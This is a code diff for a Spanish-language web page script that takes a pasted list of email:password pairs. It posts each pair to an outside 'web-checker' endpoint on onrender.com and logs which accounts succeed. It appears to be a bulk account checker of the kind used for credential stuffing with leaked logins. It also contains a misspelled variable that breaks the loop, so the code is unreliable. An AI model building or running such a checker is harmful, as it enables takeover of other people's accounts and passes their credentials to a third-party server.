@@ -1,12 +1,49 @@
-const respuesta = await fetch('https://web-checker-9xlg.onrender.com/api/verificar', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ email: email.trim(), password: password.trim() })
-});
-const resultadoJson = await respuesta.json();
+<script>
+        async function iniciarProceso() {
+            const texto = document.getElementById('listaCuentas').value.trim();
+            const divResultado = document.getElementById('resultado');
+            const logBox = document.getElementById('log');
 
-if (resultadoJson.status === 'success') {
-    logBox.innerHTML += `&nbsp;&nbsp;&nbsp;&nbsp;🟢 <span class="text-green-400">Éxito: ${email.trim()}</span><br>`;
-} else {
-    logBox.innerHTML += `&nbsp;&nbsp;&nbsp;&nbsp;🔴 <span class="text-red-400">Fallido: ${email.trim()}</span><br>`;
-}
+            if (!texto) {
+                alert("Por favor ingresa al menos una cuenta.");
+                return;
+            }
+
+            divResultado.classList.remove('hidden');
+            logBox.innerHTML = "✅ Preparando solicitudes...<br>";
+
+            const lineas = texto.split('\n');
+
+            for (let linea of lineas) {
+                const lineaLimpia = linea.trim();
+                if (!lineaLimpia || !lineaLincLimpia?.includes(':')) continue; // Nota: asegúrate de usar .includes(':')
+                
+                const partes = lineaLimpia.split(':');
+                const email = partes[0].trim();
+                const password = partes.slice(1).join(':').trim(); // Por si la contraseña lleva dos puntos
+
+                logBox.innerHTML += `🔍 Consultando: ${email}...<br>`;
+                logBox.scrollTop = logBox.scrollHeight;
+
+                try {
+                    const respuesta = await fetch('https://web-checker-9xlg.onrender.com/api/verificar', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ email: email, password: password })
+                    });
+                    
+                    const resultadoJson = await respuesta.json();
+                    
+                    if (resultadoJson.status === 'success') {
+                        logBox.innerHTML += `&nbsp;&nbsp;&nbsp;&nbsp;🟢 <span class="text-green-400">Éxito: ${email}</span><br>`;
+                    } else {
+                        logBox.innerHTML += `&nbsp;&nbsp;&nbsp;&nbsp;🔴 <span class="text-red-400">Fallido (${resultadoJson.message}): ${email}</span><br>`;
+                    }
+                } catch (e) {
+                    logBox.innerHTML += `&nbsp;&nbsp;&nbsp;&nbsp;🔴 <span class="text-red-400">Error de conexión con el servidor</span><br>`;
+                }
+                logBox.scrollTop = logBox.scrollHeight;
+            }
+            logBox.innerHTML += "<br>✨ Proceso finalizado.";
+        }
+    </script>
